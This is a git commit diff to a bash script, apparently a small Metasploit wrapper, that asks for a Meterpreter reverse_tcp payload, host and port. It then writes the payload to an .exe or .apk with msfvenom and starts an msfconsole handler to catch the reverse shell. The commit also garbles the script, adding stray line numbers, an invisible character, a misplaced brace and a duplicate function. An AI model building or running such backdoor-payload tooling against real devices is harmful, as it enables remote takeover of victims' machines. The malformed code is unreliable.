2b733a73149b2a01d28c8b27bc7d1e986b79efac
ALCOPRA007 <49591624+jehadaref007@users.noreply.github.com>
2021-03-23 09:56:30 -0400

    Update meta.sh

--- meta.sh
+++ meta.sh
@@ -2,32 +2,49 @@
 
 function a {
 echo "welcome "
-echo "pleas wint for loding..."
+echo "Please wint for loding..."
 sleep 5
 figlet ALCOPRA - J . M
 sleep 3
-echo "android/meterprreter/reverse_tcp ::( Andriod ) "
-echo "windows/meterpreter/reverse_tcp :: ( Windows ) "
+echo "android/meterprreter/reverse_tcp :: ( Andriod ) "
+echo "windows/meterprreter/reverse_tcp :: ( Windows ) "
 read -p "% Enter Your Payload : " pay
 sleep 1
-echo "press (ifconfig)"
+echo "Enter (ifconfig)"
 read -p "% Enter Your Host : " host
 sleep 1
 echo "4447,4444,3337,7773,3335,9991,5551"
 read -p "% Enter Your Port : " port
 sleep 1
-echo "/home/*user*/Desktop/(name.exe or name.apk) "
+echo "/home/*user*/Desktop/(name.exe or name.apk) "}
+27
+a
+28
+function b {
+29
+msfconsole -q -x "handler -p $pay -H $host -P $port " 
+30
+​
+31
+echo "ˈTHaNGk ˌyo͞u"
+32
+figlet ALCOPRA
+33
+}
+34
+b
 read -p "% Enter Your foldar : " fold
 sleep 1
 xterm -e "msfvenom -p $pay LHOST=$host LPORT=$port R > $fold"
 sleep 2
 echo "Done "
-echo "pleas wint ;)"
+echo "Please wint ;)"
 }
 a
 function b {
 msfconsole -q -x "handler -p $pay -H $host -P $port " 
-echo "thank your"
+
+echo "ˈTHaNGk ˌyo͞u"
 figlet ALCOPRA
 }
 b
